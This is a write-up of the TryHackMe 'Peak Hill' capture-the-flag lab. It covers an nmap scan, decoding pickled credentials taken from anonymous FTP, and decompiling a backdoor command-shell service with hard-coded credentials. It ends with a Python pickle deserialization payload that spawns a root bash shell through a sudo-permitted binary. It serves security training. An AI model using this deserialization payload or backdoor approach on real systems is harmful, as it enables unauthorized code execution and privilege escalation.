# [Peak Hill](https://tryhackme.com/room/peakhill)

First as usual, `nmap`.

```
# Nmap 7.92 scan initiated Tue Mar  1 15:26:48 2022 as: nmap -p 21,22,7321 -sCV -oA init -Pn 10.10.186.88
Nmap scan report for 10.10.186.88
Host is up (0.24s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.17.21.200
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 May 15  2020 test.txt
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 04:d5:75:9d:c1:40:51:37:73:4c:42:30:38:b8:d6:df (RSA)
|   256 7f:95:1a:d7:59:2f:19:06:ea:c1:55:ec:58:35:0c:05 (ECDSA)
|_  256 a5:15:36:92:1c:aa:59:9b:8a:d8:ea:13:c9:c0:ff:b6 (ED25519)
7321/tcp open  swx?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
|     Username: Password:
|   NULL:
|_    Username:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port7321-TCP:V=7.92%I=7%D=3/1%Time=621DD8DC%P=x86_64-pc-linux-gnu%r(NUL
SF:L,A,"Username:\x20")%r(GenericLines,14,"Username:\x20Password:\x20")%r(
SF:GetRequest,14,"Username:\x20Password:\x20")%r(HTTPOptions,14,"Username:
SF:\x20Password:\x20")%r(RTSPRequest,14,"Username:\x20Password:\x20")%r(RP
SF:CCheck,14,"Username:\x20Password:\x20")%r(DNSVersionBindReqTCP,14,"User
SF:name:\x20Password:\x20")%r(DNSStatusRequestTCP,14,"Username:\x20Passwor
SF:d:\x20")%r(Help,14,"Username:\x20Password:\x20")%r(SSLSessionReq,14,"Us
SF:ername:\x20Password:\x20")%r(TerminalServerCookie,14,"Username:\x20Pass
SF:word:\x20")%r(TLSSessionReq,14,"Username:\x20Password:\x20")%r(Kerberos
SF:,14,"Username:\x20Password:\x20")%r(SMBProgNeg,14,"Username:\x20Passwor
SF:d:\x20")%r(X11Probe,14,"Username:\x20Password:\x20")%r(FourOhFourReques
SF:t,14,"Username:\x20Password:\x20")%r(LPDString,14,"Username:\x20Passwor
SF:d:\x20")%r(LDAPSearchReq,14,"Username:\x20Password:\x20")%r(LDAPBindReq
SF:,14,"Username:\x20Password:\x20")%r(SIPOptions,14,"Username:\x20Passwor
SF:d:\x20")%r(LANDesk-RC,14,"Username:\x20Password:\x20")%r(TerminalServer
SF:,14,"Username:\x20Password:\x20")%r(NCP,14,"Username:\x20Password:\x20"
SF:)%r(NotesRPC,14,"Username:\x20Password:\x20")%r(JavaRMI,14,"Username:\x
SF:20Password:\x20")%r(WMSRequest,14,"Username:\x20Password:\x20")%r(oracl
SF:e-tns,14,"Username:\x20Password:\x20")%r(ms-sql-s,14,"Username:\x20Pass
SF:word:\x20")%r(afp,14,"Username:\x20Password:\x20")%r(giop,14,"Username:
SF:\x20Password:\x20");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar  1 15:29:56 2022 -- 1 IP address (1 host up) scanned in 187.63 seconds
```

We can log into FTP anonymously and grab a couple of files.

```sh
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 May 15  2020 .
drwxr-xr-x    2 ftp      ftp          4096 May 15  2020 ..
-rw-r--r--    1 ftp      ftp          7048 May 15  2020 .creds
-rw-r--r--    1 ftp      ftp            17 May 15  2020 test.txt
226 Directory send OK.
ftp> mget test.txt .creds
mget test.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for test.txt (17 bytes).
226 Transfer complete.
17 bytes received in 0.000372 seconds (44.6 kbytes/s)
mget .creds? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .creds (7048 bytes).
226 Transfer complete.
7048 bytes received in 0.000662 seconds (10.2 Mbytes/s)
```

The file `.creds` looks like binary so I decoded it using [CyberChef](https://gchq.github.io/CyberChef/) with `From Binary` and got a file of unknown type. Since the hints at pickling with an image, I tried unpickling the data which worked. The unpickled data is an array of 2-tuples which I processed to get a username-password pair.

```python
#!/usr/bin/python3

import pickle

with open("creds.pickle", "rb") as f:
    data = pickle.load(f)

user = [None] * len(data)
pw = [None] * len(data)

for k, v in data:
    if(k.startswith("ssh_pass")):
        pw[int(k.lstrip("ssh_pass"))] = v
    else:
        user[int(k.lstrip("ssh_user"))] = v

# remove None
pw = [i for i in pw if i]
user = [i for i in user if i]

pw = "".join(pw)
user = "".join(user)
print(f"{user}:{pw}")
```

With that, we should be able to SSH in as gherkin.

Right in gherkin's home is the file `cmd_service.pyc` which is python byte code. We can decompile it using `uncompyle6` (`pip install uncompyle6`). I can't seem to download the file after setting up `python3 -m http.server` or transfer it with `nc` so I guess unused ports are blocked by a firewall. To get around that, I simple run `base64 cmd_service.pyc -w 0` and copy & decode that on my local machine.

```python
from Crypto.Util.number import bytes_to_long, long_to_bytes
import sys, textwrap, socketserver, string, readline, threading
from time import *
import getpass, os, subprocess
username = long_to_bytes(<REDACTED>)
password = long_to_bytes(<REDACTED>)

class Service(socketserver.BaseRequestHandler):

    def ask_creds(self):
        username_input = self.receive(b'Username: ').strip()
        password_input = self.receive(b'Password: ').strip()
        print(username_input, password_input)
        if username_input == username:
            if password_input == password:
                return True
        return False

    def handle(self):
        loggedin = self.ask_creds()
        if not loggedin:
            self.send(b'Wrong credentials!')
            return None
        self.send(b'Successfully logged in!')
        while True:
            command = self.receive(b'Cmd: ')
            p = subprocess.Popen(command,
              shell=True, stdout=(subprocess.PIPE), stderr=(subprocess.PIPE))
            self.send(p.stdout.read())

    def send(self, string, newline=True):
        if newline:
            string = string + b'\n'
        self.request.sendall(string)

    def receive(self, prompt=b'> '):
        self.send(prompt, newline=False)
        return self.request.recv(4096).strip()


class ThreadedService(socketserver.ThreadingMixIn, socketserver.TCPServer, socketserver.DatagramRequestHandler):
    pass


def main():
    print('Starting server...')
    port = 7321
    host = '0.0.0.0'
    service = Service
    server = ThreadedService((host, port), service)
    server.allow_reuse_address = True
    server_thread = threading.Thread(target=(server.serve_forever))
    server_thread.daemon = True
    server_thread.start()
    print('Server started on ' + str(server.server_address) + '!')
    while True:
        sleep(10)


if __name__ == '__main__':
    main()
```

We see that it's a shell on port 7321 with hard-coded credentials. Decoding the creds is easy.

```python
#!/usr/bin/python3

from Crypto.Util.number import long_to_bytes

username = long_to_bytes(<REDACTED>).decode('utf-8')
password = long_to_bytes(<REDACTED>).decode('utf-8')

print(f"{username}:{password}")
```

We can then use those credentials to `nc` to port 7321 and get command execution. I simply put my SSH key in `~/.ssh/authorized_keys` and SSH in as dill.

Checking dill's `sudo` privileges ...

```sh
dill@ubuntu-xenial:~$ sudo -l
Matching Defaults entries for dill on ubuntu-xenial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dill may run the following commands on ubuntu-xenial:
    (ALL : ALL) NOPASSWD: /opt/peak_hill_farm/peak_hill_farm
```

... we can run `/opt/peak_hill_farm/peak_hill_farm` as root without a password. We can't read it, unfortunately, so we can only probe and guess what it does dynamically.

```sh
dill@ubuntu-xenial:~$ ls -l /opt/peak_hill_farm/peak_hill_farm
-rwxr-x--x 1 root root 1218056 May 15  2020 /opt/peak_hill_farm/peak_hill_farm
```

With some inputs like `12345`, we get the message `failed to decode base64` so we know we need some base64-encoded stuff. Since the box seems to be around pickling, I looked up `pickle` on [HackTricks](https://book.hacktricks.xyz/) and got [this payload](https://book.hacktricks.xyz/pentesting-web/deserialization#pickle) which I modified to simply give a `bash` shell.

```python
#!/usr/bin/python3

import pickle, os, base64
class P(object):
    def __reduce__(self):
        return (os.system,("/bin/bash -i",))
print(base64.b64encode(pickle.dumps(P())).decode('utf-8'))
```

Running `sudo /opt/peak_hill_farm/peak_hill_farm` with the output from the above script should give a root shell. The root flag is a bit tricky to get since the file name has some non-ascii characters but it can be grabbed by running `cat $(ls)` inside `/root`.
